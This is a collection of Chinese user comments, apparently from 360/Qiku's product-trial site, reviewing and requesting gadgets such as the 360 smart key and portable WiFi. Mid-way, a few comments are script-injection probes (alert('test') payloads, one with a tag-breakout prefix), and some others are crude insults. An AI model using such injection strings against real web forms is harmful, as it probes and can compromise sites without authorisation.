昨天收到了5期不中宝箱的智键，东西小巧讨喜，按键也算灵敏，APP也算是傻瓜界面吧，非常容易上手，智键把几个功能***后，的确是方便了许多。再说说这次活动，奇酷真的是有心思了，别看这礼物虽然几块钱，但代表了奇酷对用户的诚意啊，就冲这诚意，以后会一直支持奇酷的。
好东西不用说 大家也看的到的 赞一个  给好评
我超爱啊！但是上手度真的渣的一笔！你要吗！我给你寄过去你试试！！！
= =你···橡皮泥吗，搓成一根牙签装的细条，软的时候立不住！需要硬了以后才能定型！（我又邪恶了！）这个也是一样的，刚从笔尖出来的时候就像一坨屎一样啊！！！！而且是弯折的！我都是在纸上画呈直线，立体画需要用一点力道抻拉才行！ 
= =上帝创造我的时候，逗比的原料放多了！
分辨率为400×240的3英寸触控屏、16GB储存空间、2GB RAM、德州仪器Cortex-A8处理器以及1000mAh锂电池 这种3年前的顶级配置，现在山寨手机200淘宝上随便卖，加个臂带才十几块钱，这也叫创意？搞笑吧？
既然是这个牌子，起码得是全碳纤维或者钛合金的外壳，顶级线材，18K金插头吧，现在这个价位这个做工，连魔声面条都不如
4月22日发的货，11183快递，23日就到了，真快啊！迫不及待地装上了，却安装不了app，一看才知道，我的是安卓2.3.5版，智键只支持安卓4.0以上版本啊，看来需要换一部手机了！
这个安保系统完全可以用内置安卓系统设计
真的掉渣渣了吗，我还准备买一个呢，犹豫···
很多电器并不是通电了就工作了，还学要按开始，并设定一些东西的啊，这个怎么解决？
着实很意外，糖果色很炫！
这个产品 申请人很多 .......证明需求 大....
什么时候出个核动力的吧！
这个产品从介绍和图片上看都是好东东。希望第一时间得到它。
昨天收到智键了，比我想象中的要好看太多了，插上我的mi2不用安装app就可以使用一键播放音乐。太实用了。支持智键，支持360！
收到了，绿色的很好看
使用的时候发现有时候影响通话，通话的时候听不到对方的声音，一拔下来就回复正常
这一刻的健康数据，尽在你我的手机之上，相互分享
收到了 很不错的 绿色的 安全绿 超喜欢 信号也很稳定
重点不在这好吗？
不错，赞啊~！ 希望聘用. 
你好粗鲁、
。。。。。
真的挺好用，我的手机是小米2A，第一次用成功抓拍一美女，效果很好
很是期待，看着就很酷，用着一定更酷！
昨天早上收到的 安全绿的 总体来说我个人非常满意 小体积 高稳定 内存占用小 值得推荐
没有在奇酷网申请试用成功过，希望有个机会能够试试，谢谢~
东西收到了，绿色的，这个产品已经基本为大家所熟知，应该没啥介绍的了，要是有U盘功能相信会更好！
典型的“小米思路”，宣传多么牛X的数据，其实用的最烂的硬件设备，都什么时代了，还在用USB 2.0。优盘最重要的就是读取和写入能力，USB2.0都是哪个年代的产物了，还敢用2.0吹有怎么样的速度，跟小米一样，骗没有文化的农民工的血汗钱的！
1111111111111111
111111
&lt;script&gt;alert(‘test’)&lt;/script&gt;
&gt;&lt;script&gt;alert(‘test’)&lt;/script&gt;
&lt;/div&gt;&lt;div class=&quot;content&quot;&gt;&amp;gt;&amp;lt;script&amp;gt;alert(‘test’)&amp;lt;/script&amp;gt;&amp;nbsp;&lt;/div&gt;
我想知道真的是审核过的吗？为什么作为一个设计师我觉得这报告质量好一般。
360智健收到了，非常精致，测试了一下，很好用，就是闪拍要练习，有时候，拍出来的照片会模糊，别的偶尔有失效的时候，大多数时候还是很好的。
360的产品比较靠谱的，永远支持360，做360的最忠实粉丝。
今天下午刚收到，之前刚出来的时候就买过5~6个，所以我觉得应该没什么介绍的了，太了解了
不需要审核~！完全不需要，负责任的告诉你，你只要不发黄赌毒，啥都能过！
产品比较优秀，按键功能精确度待继续升级，有时会有无作用现象； 另：“抓拍”模式下，拍摄的照片无聚焦功能，以至于拍摄出照片模糊现象，期待改善。
东西今天下午收到了 是绿色的产品挺小的方便携带不错
一直在用，非常方便
收到了360公司发来的随身WIFI一只，从外观来讲很小巧，方便随身带，包装上也很精美，但是上手的第一感觉就是，每在一台电脑上用需要安装驱动，这一点如果能优化一下，不用安装其动，或者用自己的USB驱动也行呀，这样更方便，还发现一点，信号上不是很稳定，几米的范围还可以，一间屋子大了，信号上都会减少很多，如果能加强一下信号的发射就好了，因为人不可能一定就坐在一个地方上网吧，有时还得走走之类的，
收到了360公司发来的随身WIFI一只，从外观来讲很小巧，方便随身带，包装上也很精美，但是上手的第一感觉就是，每在一台电脑上用需要安装驱动，这一点如果能优化一下，不用安装其动，或者用自己的USB驱动也行呀，这样更方便，还发现一点，信号上不是很稳定，几米的范围还可以，一间屋子大了，信号上都会减少很多，如果能加强一下信号的发射就好了，因为人不可能一定就坐在一个地方上网吧，有时还得走走之类的， 
智键非常小巧，完美支持华为U8825D，最人性化的莫过于自定义功能了，可以根据自身需要设置要启动的程序，但是发现一些瑕疵，希望奇酷可以参考改进： 1、抓拍功能拍到的图片比较模糊，很遗憾无法智能调焦，这可能和“抓拍”有关吧，如果等到智能调节完成，美好的景象可能就错过了（如果用“智能相机”功能倒可以调焦）。 2、按键轻按没有反应，必须用力按才可以激活所设应用，长时间用力按，必定影响智键寿命。
第一次中奖，虽然是个小玩意但是很开心。智键挺不错了，支持。。。
产品都很不错 支持奇酷 希望以后试用的产品和数量能更多些
今天收到了360寄来的智键产品，通过扫描二维码安装APP后，插上智键识别成功后，开始了测试之路。 1、智键在照相、开启手电等功能感觉有些延迟。 2、智键在插入耳机孔后，感觉拔出有些困难，希望设计一个简单的拔出槽。 3、插入后没有了扬声器声音，也许这是一个不能解决的问题。 继续测试中......
没有在奇酷网申请试用成功过，希望有个机会能够试试，谢谢~
小米盒子。。。
跟工厂里用的热熔胶枪是一个道理，ABS高温降解后味道是很难闻的，好处是流动性好一些。再就是这为幸运儿有没有试过用层层叠加的办法创建三维模型呢？
很好，可惜，我是安卓3.2。3.2，3.2啊！不能更新！
偶然的机会让我遇到了奇酷网。从此遍一发不可收拾。试用装你快来吧。
我现在还在更新360儿童卫士的测评 有人看吗？小编
你麻痹的，这什么情况，试用你妹啊
小米3  小米3
期待有更新。。。作为一个设计师，起码发点作品上来吧。作品逗比才是真逗比
其实奇酷还有一点做的不足 就是试用品发货不给快递单号 让试用er不知道试用品去向
怎么去围观？
收到了！安全绿！霸气的外型，风骚的色彩，放到我的iPhone上，天仙配的感觉！就是觉得安装驱动有电慢了，能不能U盘里自带一个RAM，可以随插随用就太好了，我现在很期待8G的U盘版，如果能出120G，64G，32G的就更好了，我肯定买一个128G的大U盘
功能不错，赶紧出成品吧，期待啊
很方便，希望能早点实现，价格要低点啊，哈哈
手表样式很新奇，期待早日出成品
样式和功能都不错，但是续航就是最大的问题了
居然没了。没了？
不错，非常期待
我想说，我这么喜欢画画和设计的人，还有那么多绘画作品，怎么就没能得到试用呢，其实这才是我最喜欢的试用~~~啦啦啦，不过官方也有苦衷的，要谅解哈，期待更多的好产品和报告！！！
很不错的产品，小巧实用，一如既往的支持360.
为何评测可以写的如此逗趣！
西今天下午收到了 是绿色的产品挺小的方便携带不错 
补充说明是昨天下午就收到了，是绿色的，感觉不错，安装相当方便，插上就能自动识别，还送10T云盘空间，相当给力。我在房间里试用了一下，距离8米，手机信号有3格，走入房间，隔一道墙，手机WIFI有2格信号，不过传输文件很稳定，个人觉得360随身wifi质量有保证。
绿色的不错呦
每天上下班都走路，真心希望能试用 。
真的很不错小孩玩的踏板车和这个差不多
貌似里面用的是聚合物电池，容量挺小的，估计才六七百毫安时，经常定位电量肯定不持久，期待未来的太阳能充电技术用在上面
定位是不耗流量的，上传位置数据才用到流量
外形很亮眼啊，希望更加智能、普及到生活中
价格应该算是很便宜的吧。外形很不错。
盖子内侧绒质材料很容易脏吧？不过目前纸电池不好普及，手机越做越薄，很多都做成一体了，没后盖，电池不可卸
赞一个，但是错别字太多了吧~~
希望内存卡大一点
体积大可以应该放在手臂上不适合手腕了 
终于出来了，关注好久了
速度调节很重要
老了需要关注一下身心了
和想象中的差不多，差不多的大小，不过拿到后确实惊了一下，真的很小，然后立马就试了下，果真，手机效果好的不得了。一如既往支持360。
求预定网址
创意不错不过应该把动力储蓄为电力再进行脱水人的动力脱不好水 
环保很重要可是如何确保丢入的东西能够分解是问题怕堵
住宿就缺这东西
 流_氓小四 高端大气上档次  
收到啦！360wifi2就是给力。好方便好给力。
这个真不错，正适合我用，家对面洗浴中心装修，我这楼一开窗户全是灰。沈阳雾霾也严重。不开窗户还憋气。有了这个净化空气对上了年纪的爸妈和自己是绝对必需品。
很期待啊！！！~
每天上学都走路，还2KM多嘞，真心希望能试用 
天天跑步，不知道跑了多远，希望能通过，看看一天跑多远，消耗多少热量
我也是会员，怎么没中，我擦 
还是很贵的说。。
看了好几家最后选定这家，看来我的选择真的没错，宝贝超酷啊，才用了两分钟就能掌控了，儿子好开心，这款车车几乎没有噪音，大爱啊！物流很神速，卖家服务态度很GOOD。现在他们9980还送iWheelMart车包
是网站没及时更新吧，智键就写着可购买，点进去一看也就是期货
我现在每天早晚都在跑步正是我需要的，希望能通过。
太大了一点都没有美感
东西收到了，优点就不讲了，讲点遇到的问题以便工程人员参考改进。手机为华为C8813Q，首先机子自带的图库不能添加到智键，后下载安装快图浏览到手机能识别了（如果能识别手机自动的程序更好）。再就是，按键有1-2秒的延迟，有时按2下打开的程序是按1下的。                                                                ----360的忠诚粉丝
我有360智建；360wifi；360钱包；360移动电源；360小U型枕。我是360卖家；有360的；我可以收藏。私信 我  
收到啦！360wifi2了
很酷的一个小东西哦！！哈哈！大爱~~360忠实粉丝
我好像要啊
垃圾测评，一看就是急忙赶出来的
写的这么烂，真实把东西浪费了
没有手机申请你妈个逼啊，把机会浪费在你们这些都比身上
一都比，没手机申请你妈逼
又是一没有手机的二逼
没有手机申请你妈逼啊，把机会给有手机的
各种拔丝效果，这只笔实用性欠佳啊。
我都崔了好几遍了、希望有机会得到、
申请了很多期了，希望能中上一次
麦歩-----永无止境的脚步、留住健康的脚步、
不是很好用啊 在我的百度100A手机上没反应
已收到360WiFi，非常小巧实用，功能也很强大！谢谢，我会一直支持360
是挺着急的，我测评里也如实写了，不需要你再评价了！
4月下旬这是官方给我们的承诺，如果一个官方都不守承诺那还有什么可说的呢？国家主席都言出必行，皇帝还说话算话，不食言，黑帮老大还讲信用，讲义气。除非360一直在耍我们，去年至今360推出好多产品了，有几个上市的。都在那里虚假宣传。以前很喜欢360公司，电脑装360的所有软件，可是人是会变的。太让我失望了，失望透顶。失望透底。
4月下旬这是官方给我们的承诺，如果一个官方都不守承诺那还有什么可说的呢？国家主席都言出必行，皇帝还说话算话，不食言，黑帮老大还讲信用，讲义气。除非360一直在耍我们，去年至今360推出好多产品了，有几个上市的。都在那里虚假宣传。以前很喜欢360公司，电脑装360的所有软件，可是人是会变的。太让我失望了，失望透顶。失望透底。
 典型的“小米思路”，宣传多么牛X的数据，其实用的最烂的硬件设备，都什么时代了，还在用USB 2.0。优盘最重要的就是读取和写入能力，USB2.0都是哪个年代的产物了，还敢用2.0吹有怎么样的速度，跟小米一样，骗没有文化的农民工的血汗钱的！
不是很好用啊
没有达到我的期望值！
    申请的好多次了  求审查给过   求中
宇宙联通5G，我穿越啦？？ 
已收到360WiFi啦，非常小巧实用，功能也很强大！谢谢，我会一直支持360 
Mac Air看起来很爽。
bu   hao 
矫情............
应该来个拔丝水果
已收到！绿色 很迷你 一插即用 网速也很快！💯
有更新，报告趋于完善了！
小小的一个防尘塞，使用很方便，按键的灵敏度很高，一键直达应用，抓拍的效果也不错，很实用的小东西，平时不怎么听歌的人最适合用了！
3000毫安电池+VOOC闪充”技术,值得期待！
L型造型很可人,无需下载应用直接传输很便捷。
一秒拍摄3至5张，可连续拍照24万张。一个按键即可将所拍的景象已及时转成缩时影片，大爱！
朋友这是需要购买的
内置了多种传感器，还可监测心跳、血压！不错的产品哦！
功能单一了点，性价比不高！
按键手感略胜米键一筹，软件方面还需继续优化，希望能提供更丰富的功能
原笔迹轨迹，确实不错哦。
当耳机不仅时候耳机时，确实让人心动！
手感不错 防尘美观   不过不支持2.3版本啊   再兼容其他版本就更强大了
不一样的设计思路，很酷的穿戴装备！
期待后期软件系统的跟进和网站的支持！
高富帅童年必备玩具！
一定要通过啊，我预定过：智键，3d打印笔,三星NOTe3，求过，，求过
就是有点贵了
造型够酷，功能丰富,这款智能产品不错哦，期待续航能力！
怎么没有更新呢
收到了360公司发来的随身WIFI一只，从外观来讲很小巧，方便随身带，包装上也很精美，但是上手的第一感觉就是，每在一台电脑上用需要安装驱动，这一点如果能优化一下，不用安装其动，或者用自己的USB驱动也行呀，这样更方便，还发现一点，信号上不是很稳定，几米的范围还可以，一间屋子大了，信号上都会减少很多，如果能加强一下信号的发射就好了，因为人不可能一定就坐在一个地方上网吧，有时还得走走之类的，  
梦寐以求啊，无人驾驶概念车！
这么多款啊，风格各不相同，居然都喜欢哦，我太博爱了！呵呵！
女汉子专用哦
就连我们每天都要用到的牙刷也智能起来了！
超实用的手环啊，期待更强的续航！
不错，有你手握制作的图片就更好了
它只是一个无线智能音箱
拒绝酒驾，另外，老婆查岗必备！
真是浪费，哎，怎么就不能提高下，、？赶紧修改吧
个人水平有限，觉得烂可以不看，我就觉得东西不是很好用，有本事你也去弄个试用啊= = .
试过了，想做个花瓶，一层一层的叠加，但是真的是····不成形，也可能是咱用的不熟练 反正我是觉得东西很一般。
你的提议有意思:)
记得一定要薄
谢谢关注！
这也算创意么 我上初中的时候就画出草图了，实际比自行车累速度还慢才放弃了，亏他好意思说锻炼肌肉呢。
写得好，东西更好！期待这一期的试用哦
期待平民价
鼓掌吧，亲们！谁抢到沙发了，我就给他10q比！
呵呵是我！我好厉害（jian)!
很喜欢，反应速度很快。很某米真的有很大差别
看起来还不赖还不赖  
时间过去了  还没有出来
这么棒！和360打交到的企业真多！
东西很小，就是于一些手机不太兼容！
360.越来越厉害啦，好想要一台啊
真心希望不要用EMS发了，到现在还没给我送来，上次给我打电话态度特别差，之后久没音信了！
反正不便宜》。。
这样的东西在需要的人眼里，确实很实用。期待后期更多作品的展示。
4个小时，你太厉害了！呵呵,想中二发，就再展示些作品吧！鼓励一下，给个赞先！
好象不错，请了。
希望能增加多连击功能与相机闪光灯与像素选择功能。希望能完善
好想要一台啊
诚意申请，希望通过，最近刚好准备减肥计划，很有用哦
北京空气不好，偶们还是不要申请了，让给北京的小伙伴们体验吧
我要，鼻炎患者
1、快递速度较快 3天收到 2、包装小巧，安装便捷，有年轻人的感觉 3、操作界面简单，使用人群较广，体现了人性化
拯救雾都魔都人民
我们这的空气近几年污染相当严重，大部分时间都是严重污染，真心希望能有有个空气卫士还保护我们的身体，谢谢
嗯嗯，360出的这款不错，但是只有20个名额
怎么购买》？
怎么还没消息？官方放假了？
哇，希望我能尽自己最大努力把它争取到手
嗯，但是操作的时候左手也是有用的，如果要拍的话得找个人帮忙一下
看到就屌爆了
反应很快，就是没有截图功能
骑到大街上回头率 杠杠的
要不要这样啊，不要骂人好吧，还没弄完呢？弄完了再说。。。。。。
我也好想要。。。
好像要，可以自己打印模型，可是好贵。。。。。
最后的使用心得是复制我的原文……真行
1、快递非常快，EMS第二天就到了。2、包装简单大方，智键做工也很好，但是联想手机安装软件后，只能识别是否为耳机或智键，却不能使用智键的功能。3、在LG手机上使用后，非常流畅，拍摄后手机会震动一下提示，如果使用智键的拍照功能，会弹出界面。4、录音功能很简单，但是还不清楚是否可以修改保存位置和格式，需要再尝试。5、感觉智键的按钮有些突兀，如果和手机耳机齐平，略微凸起就好了。
希望天上能掉馅饼！O(∩_∩)O哈哈~
方便耐用啊！！！！一大神器~~~
毕竟跑步比较单调，如果加入音乐功能会更好些吧
求过 求试用   以后可以跑步测卡路里了
还以为是电动，失望
价格高，而且实际行驶速起来，电量肯定会不给力，不过产品设立理念很棒
控制一些灯还是很方便的，但是控制电器就不理想了。
产品虽好价格高，骑行者的福音啊，
一块好肥皂，和喵王是一个性质的产品，不知道有没有移动电源功能。
已经预约了，但是没有消息什么时间开卖。
很好，很好很好，可是我没用过，看着只能说好，哈哈哈
嗯嗯，360出的这款不错,但是对于我们来说，有wifi的话一点要求，就是要信号好
先说声谢谢呗
希望再精致美观些，价格1000RMB左右，绝对火！
很期待，不过价格别太贵！力挺360！
太好了，希望我的申请通过
对于胖胖的我来说 这个很合适 嘿嘿嘿  “希望你能陪我在运动的每一天”
非常漂亮，满意
突然收到短信说连续5期不中的我可以获得一个鼓励，哭笑不得的选中了智键，快递很快就到了，以为要写个报告什么的，试用了两天拍了和同类产品的对比，结果只要写个评论，好吧。对于别人说的智键还是大了，***去突起太多了，我只想说句你没用过别的，用了就知道智键多么的小巧的，小编可以告诉我哪里可以上图吗？算了微博@你们吧
新房马上装修好，最近正在选除甲醛神器，希望可以试用到
为什么我3天前就已经发货但到现在还没有查到物流信息啊
希望下步的软件设置中可以增加一个选项，在锁屏状态下，使用或者不使用智键功能。夏天手机放口袋里，经常误碰到它，手机屏幕开了半上午，电池不撑用。总的来说很不错，相当于手机多了以个可以自己设置的物理键。
不错啊   我能用到
这个不错 很需要赶快出售吧  360给力 
这个怎么申请  真是好东西
应该有效的防止误操作，按一下的经常被误操作！其他功能非常好，加一点娱乐功能更好了
塑料感太强了，有待改进
有个性，如果能做到三防就更好了
这是个好东东，我想要，我想要！
360越来越牛了，希望以后可以看到更多的360产品，也希望我可以试用
就这玩意都550，我只能呵呵呵了。随便拿个触控笔在触控板上划都可以实现你一大半的功能。
卖功能的还是卖外观的。
感觉小时候的玩具。
新产品就是贵。若干年后都是街边货了。
好粗，拿着不舒服。
戒指不好看，有也不想带手上。
原理这么简单都卖这么贵。
有钱再买。
全是English ，唉。
比化学药剂好，不过不知道耗电这么样。
本想写一篇图文并茂的精彩评论,可360好像不需要,只要随便写写了.. 众所周知的优点不就提了.什么操作简单,设计人性化,外观精致,简直弱爆了. 经过本人三天三夜不眠不休的精心测试,发现了一个天大的功能,就是把单击或者双击设置成微信.当有新的消息来时,就可以直接点开查看,而用不到下滑拉消息框那么麻烦了.当然,QQ也是一样. 再说个缺点,这东西脾气不好,有时候按了半天才反应,有时候直接无视我,教训他.
这报告........你确定不是糊出来的吗？
真心希望能够支持IOS~
体感游戏的神器！期待很久了好吗
我觉得这个产品就是no zuo no die~很无聊的一种产品
希望给个报价，这种体测类的周边真是喜闻乐见~
这种都属于耗材啊~虽说600元的电动牙刷跟飞利浦家比依然算很便宜，但刷头的价位应该不会低~怎么，这个是可以监测牙菌斑和牙结石吗？最好加上冷光洁牙~
为什么不卖1360元呢！！！
收到360WiFi，非常小巧实用，功能也很强大！谢谢，我会一直支持360 
我们都是高血脂，这旮瘩蛮合适的，不管申请成功与否，先赞一个哈！
虽然用五次申请试用未通过的辛酸经历换来的，不过还是非常感谢360和奇酷网的支持！我会一直申请试用，直到成功为止！加油，360！
太贵了吧。 好东西要得到普及才是王道。
还真是挺有料啊。20台。一台1440。
关注，好运~~~~
360防丢卫士？
这东西很实用，很多人都期待呢，如果我不过，希望别人能过。
收到了！但太小又忙不知道丢到哪里去了？
哇！看样子可以有效解决PM2.5，到家前先遥控打开它，啧啧啧，好东西！
看起来不错，期待可以快点出来，最好是可以薄一点
满不错的，只是有时间，锁屏不太兼容。另外长按360一键，不能设定。
似乎不是很适用，因为我们没办法去避免每天的光照
真没文化，你以为远在千里还能无限充满充电？
这东西会发展起来，你的nexus5不借助无限充电能充电吗？还不是一样要插线。
之后应该会开放购买吧
什么时候可以买的到啊？
什么时候出了呀
关注关注一下
关注关注一下
。。。好棒啊  
很期待啊。。。
进过多天的试用，发现盖子内侧的绒质很容易脏。 这几天又改造了一下，对我在通用性方面提的想法进行了验证。后续补充。 对一体的手机。就难以再使用这种方案辅助供电了。
刚用时来电了，结果听不到说话声，后来才知道原来耳机上插了这个小东西，用了感觉不错，希望能有机会继续试用你们的产品。
如果更精美就好了！
嗯嗯，不错，喜欢喜欢，很牛叉！
因为太贵，太暴利，才会有山寨的出现，而且该产品科技含量太低了，随便就能模仿，甚至自己动手就能做。
好东西啊！好东西！
什么时候开卖呀  
yijing
首先，感谢智键带给我不一样的体验。在我手机的home键几近失去功能的时候，带来新的生机。小巧的智键带给我很多的惊喜和便利，同时它的保存有点难到我了。有些喜欢音乐的我，有时大大咧咧的，把智键取下来，经常忘掉，然后惹来一阵心急。希望智键可以发展和耳机相结合的部分。最后，期待智键的功能越来越强大！加油！
这个蛋疼的读写速度，，坑人啊
数据零点清零的话，怎么对比每天的数据呢？能上传保存么...还是希望有机会试试
360奇酷真舍得花血本啊~~~~  支持360  支持奇酷
外观漂亮，便于放置，绝对是自行车中的战斗机。
配置高，性价比高，什么时候开卖啊。
好东西啊，解决甲醛什么的
你们可不可以不截图淘宝的买家照片，唉。。。
你们可不可以不截图淘宝的买家照片，唉。。。
感谢360，奇酷在我多次申请试用失败后的小礼物，当时抱着无所谓的态度点击了礼物，没有想到是360智键，这个我一直想要的产品，今天到手后，一个个功能是试用，最后感概科技的进步与强大，360科技开发人员的头脑。真的是解决了我们操作手机是繁琐的转换屏幕与寻找的时间。在一按或二按之间随意切换我们需要的程序，真的是太方便了。最后提个小意见，就是按2次的时候，间隔短的话，默认是按一次，希望能识别的更快更准。
为什么还不开卖？我儿子等好久了。
五次未中的奖品，当作纪念收藏了，继续申请试用。不成功决不罢休。 360随身wifi之前就已经在用了，确实是好东西，好帮手。
为什么申请了6次都不中？是因为我表格填的不够好吗？每次都是认真填写的啊！
感谢360，在我多次申请试用失败后的小礼物，算是个惊喜吧，但是我的手机是苹果的，没有办法使用，希望能有苹果版本的，在朋友的手机上使用了下，效果还不错，真是科技改变生活，一开始刚接上时候，兼容性不是很好，操作了会没有反应，现在送给朋友了，再过几天再补充使用的效果吧。
我填了5期，都没中 但是有个5期不中的活动 开出了个 随身WIfi 
看到各位大神从一开始就申请了，我只申请了2次，看来这次没戏了……
不错的产品，我非常喜欢，希望能出更多高科技的东西，感谢360
这个很给力啊希望能够申请成功 
收到了绿色的  之前就有白色和土豪金的  很小巧  用着方便。
收到了，360WiFi2代
蛮搞笑的，这报告写的，估计那边要骂娘
太酷了，支持360！！
太大了点啊，，不太方便
1.银色比原来黑色更时尚精致。2.第一版按两下时九宫格是选择后决定按一下出什么，第二版有一下两下，但需要进程序才能切换，麻烦。希望能有按一下出九宫格或菜单，选哪个就出来那个程序，这样两种按法就是18个程序，现在只有两个功能，太少。3.插上显示耳机不会自动识别，要解锁进程序才识别。4.有时不够灵敏，没反应或卡顿，抓拍很方便，但成像不清晰。5.希望智键上有孔可以挂wifi，就是WiFi的防尘塞就是智键
真的不错啊
雾霾 PM 再也不用担心了
好东西，一直都觉得360能给我们不一样的世界，果不其然……提交申请了，希望能中……
今天收到东西了，非常好，好东西，一键拍照，手电筒，非常好用
这个真的太棒了
支持一个吧
造型小巧美观 创意也很好 GOOD JOB 
我能中一台就好了，刚搬了新家，虽然新房放置了半年，但还是有点点味道，我家小宝宝天天晚上揉鼻子···········
好想要   已经申请过好几期了     求过  求关注
真的喜欢   求给通过   申请5.6期了  一次都没中过  我去.....
想在***的高原试下这个东西。
已经得了智键和WiFi，虽然东西小不值多少钱，但360对用户的态度让人觉得非常贴心，铁粉。那些光吆喝发奖时来假的那些的网站啊公司啊不害臊么。
很给力哦，可惜我没试用到
app系统给力，过滤系统给力
货已收到，绿色环保色，小巧精致很喜欢，而且很方便随身携带。
关心续航！什么时候能用上就好了
忘记评论了，360智键顶！还没用呢，赞一个！
奇酷网太给力了，想什么来什么，！
今天收到了！ 用了下，很不错的 东西！很便捷，就是闪拍不清晰  室外就好点！功能不够强大 啊！ 
太给力了。
我的使用感受图文http://bbs.360safe.com/thread-3962919-1-1.html
写的很不错哦。单车做的很不错。
太帅了。有美女还有萌娃。
哈哈。挺好玩啊。制作的东西还需再进步啊。
期待继续更新好的3D作品。
拔丝效果应该可以清理掉的。就像用胶水粘模型。如果粘不好也到处都是手印一样。
骷髅头。还有恐龙。
这个有点吊的~  
app的手势相较快按钮之类的其他同种app略少
希望中签！
图片处理中！
咨询一下,我的手机耳机插孔比普通的3.5耳机要长,属于加长型的3.5的耳机插孔,不知道能否用这个智键?
1、货已收到，绿色环保色，非常漂亮。 2、试用一下，安装方便简单。 3、二米内距离WIFI信号强烈，满格状态（办公室内），超过后信号逐渐衰弱，超过三十米后信号及其不稳定，忽高忽低，有时满格有时仅一格，甚至没有。 4、总体比较满意。
这个很给力啊
这个怎么购买啊~
你这不是扯犊子么？
非常给力的产品~
虽然我连续6次没有通过了，希望360给我一次机会吧~~~
我申请了N次也没有中过啊，是什么节奏啊
不科学唉唉啊
最上面有天猫商城链接
求中！中签吧！
功能强大，随身携带方便。
申请很多次一直没有中过，希望这次能给我一次试用机会吧
绝对霸气啊
心动了，咋办呀？用不用卖肾啊？？？？？？？？？？？？？？？？？？？？？？
居然出神器了，期待这次申请人数再创新高！
快点做出来吧
太好了，希望试用。
还没出结果 好期待
已经预约了，但是没有消息什么时间开卖。 
小公主冠做的不错，期待更多的作品。
很酷的的单车，报告写的也不错。
360智健用的EMS，速度很快，打开后一个小巧精致的袋子，里面装着360智健和使用说明书，根据说明书安装后将按一下设置为HOME键，按两下设置为拍照，实验后发现拍照真的很方便了，没有任何声音，但需要使用者掌握好焦距，不能抖。试用几天后感觉各种功能都很实用，而且360智健做工也很精致。两个字“很棒”。
谢谢支持哦~嘿嘿~也祝你好运！
谢谢支持哦~嘿嘿~也祝你好运！
谢谢支持哦~嘿嘿~也祝你好运！
关注关注在关注
哇哦 好棒呀~~羡慕
车子好酷！！
终于收到了，安全绿，入目清爽。功能一如既往的强大和好用。算上自己购买的，这已经是第27个随身WIFI啦！身边的朋友都说好用，云盘更是工作生活的好帮手！要是奇酷能给一些新产品的试用机会就更好啦！
希望我能申请到……
好像有i个，中中呗
呵呵，你看的很准，谢谢支持
对，丝线真的很细，随风飘舞的样子，所以清理的时候，最好要戴口罩，防止吸入口中。。。
申请了很多次没有通过，希望这次能够通过，能给新人一个机会 ，嘿嘿
一直申请一直没中过，希望这次能给我一次试用机会
最低 899 美元 太贵了吧 
EMS给力，袋子上写的是一键钟情装哦~~ 试用了一下，单击效果是可以的，就是双击不管快按还是慢按都没效果，不知道是什么原因，正在深入研究中
心痒了，喜欢！
从来没中过，希望可以给我这个机会。
我很想加入智能硬件的团队
求中！感谢老总
天灵灵地灵灵，一定要中签呀
配置有点差，跟苹果的mac mini比就逊色很多
希望申请个用用看，谢谢。
喜欢这样简洁的设计，期待智能家居时代的到来~~
已经申请了，好希望能试用哦~~
抓拍完不是有震动么。。
奇酷会员就是奇酷的登陆用户。
这莫大  希望可以变成眼镜
我给出厂价好了。贵的好吓人
好想买呀！！！
一直未成功试用过……
估计好用！
现在所有的穿戴设备中就这个是最有感觉的，在看到他的第一眼就有一种想要拥有它的冲动。
求中@！！！
360能否针对其他品牌的手机开发一些应用 
快开卖！！！ 
绿色环保色已经到手，感谢奇酷网的慷慨解囊，算上自己买过的已经是第五个了，很好很强大，云盘功能很实用，方便工作。赞一个！
希望给个机会  真的是很真心的。
标准数据是多少？第三方认证呢？
感觉不错，希望有机会试用~
小米电视多大 
中国专用产品
这次能成功吗
新装的住房能免费试用就太好了 效果可以的话大力推广
外观不错，只能说一句：好想要啊
从没有中过
很想购买，请问什么时候可以
iphone
现在可以买了吗? 有现货吗? 现在购买,最快什么时候拿到货?
哈哈哈哈哈
马上交房了，不然我试用就太没天理了+
什么时候出啊
早就想要一台空气净化器，这回好了
如果可以，我也来给才能公申请一个试用一下，他一定特别喜欢
还在开发的产品，用的接口是上一代的30针接口？
360如果能够针对其他品牌的手机 研发一些应用产品 就更好了 
以后搞一家这种跑步机的网吧，绝对生意爆火，50一个小时都有人玩
希望能增加截图功能，那样我就不用一次按住home键和电源键了。
大而丑！！！
好牛逼的样子
收到后就试了下，很好用，优点就不多说了，也看了很多的评论，就说说缺点吧，主要就是插拔的时候不太方便，插入时不可以按到上面的键，而且拔的时候一不小心就掉了，而且东西比较小，如果掉在地上特别是室内，很难找。功能方面很实用没得说。
kindle不是平板，它是专门用来读书的
感觉不同，墨水瓶的屏幕的看的舒服
 - -！的确有点贵
好漂亮啊！
新房空气净化器选购中，希望有机会。
盗图么？。。。
提示下 乐此不疲是形容做坏事的 是贬义词 别乱用
新房空气净化器选购中，希望有机会。
终于收到了，安全绿，入目清爽。功能一如既往的强大和好用。算上自己购买的，这已经是第2个随身WIFI啦！身边的朋友都说好用，云盘更是工作生活的好帮手！要是奇酷能给一些新产品的试用机会就更好啦！ 
给我一个.....新房空气净化器选购中，希望有机会
留个电话？
给我一个机会孝敬爸爸妈妈
快递还比较给力，收到了，绿色的，很不错，朋友都说好
新房空气净化器选购中，希望有机会。
妹子人又漂亮 羡慕嫉妒恨 啊！！！！
贵，但是一旦上线的话被模仿的几率很大，价格应该会很低
太大了 戴着不是很方便
咦，为嘛图片无显示？我再来编辑一下
申请试用好多次了、没有通过一次、莫非......？？？？？、
看起来很酷的游戏产品啊。
给妈妈买了一个，还试了试，真得很准，确实挺方便的。
收到了，非常好，功能非常强大，现在上班已经离不开360WIFI了，赞一个，感谢360公司！
孝敬爸妈-T3空气卫士！ 亲，来一台吧
不错     来一台吧
试用产品，会那么的幸运么， 好想被抽中一次 感觉一下产品；
好用，功能再多点就更好了。
可以内置电池（纽扣电池/特制电池），在顶端加一个适合测量人体的温度传感器。而插入耳机插孔可以为电池充电
速度真慢啊，，还没发布。
宝宝需要啊！！！速来一台。亲！
好产品，希望得到试用哇！
收到智键，心情是那么的鸡冻。插上试一下。不能用！捣鼓半天，官网查找原因。终于有了结果。 我的手机 【金立gn700w】 在“完全不适配机型”之列。我伤心，我郁闷啊。 不知以后能不能适配该机型啊？？？求解啊
我很喜欢这个产品。健康有的时候确实就是细节。
功能少了点，希望能出ios版的
健康第一，希望能抽中。期待。
希望能有抽中，期待中。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
